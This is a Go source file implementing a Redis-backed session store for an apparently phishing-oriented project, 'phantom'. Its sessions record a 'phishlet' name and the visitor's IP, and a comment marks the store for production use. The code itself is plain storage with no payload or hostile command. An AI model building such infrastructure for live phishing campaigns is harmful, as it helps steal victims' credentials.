// Package redisstore — SessionStore на Redis (prod). Memory остается для lab/tests.
package redisstore

import (
	"context"
	"encoding/json"
	"time"

	"github.com/google/uuid"
	"github.com/phantom-v2/phantom/core"
	"github.com/redis/go-redis/v9"
)

type Store struct {
	cl  *redis.Client
	ttl time.Duration
}

func New(addr string, ttl time.Duration) *Store {
	if ttl <= 0 {
		ttl = time.Hour
	}
	return &Store{cl: redis.NewClient(&redis.Options{Addr: addr}), ttl: ttl}
}

func (s *Store) Ping(ctx context.Context) error { return s.cl.Ping(ctx).Err() }

func (s *Store) Create(ctx context.Context, phishlet, ip string) (*core.Session, error) {
	sess := &core.Session{ID: uuid.NewString(), Phishlet: phishlet, IP: ip, CreatedAt: time.Now()}
	b, _ := json.Marshal(sess)
	if err := s.cl.Set(ctx, "sess:"+sess.ID, b, s.ttl).Err(); err != nil {
		return nil, err
	}
	return sess, nil
}

func (s *Store) Get(ctx context.Context, id string) (*core.Session, error) {
	b, err := s.cl.Get(ctx, "sess:"+id).Bytes()
	if err != nil {
		return nil, err
	}
	var sess core.Session
	if err := json.Unmarshal(b, &sess); err != nil {
		return nil, err
	}
	return &sess, nil
}

// Drop сбрасывает сессию.
func (s *Store) Drop(ctx context.Context, id string) error {
	return s.cl.Del(ctx, "sess:"+id).Err()
}
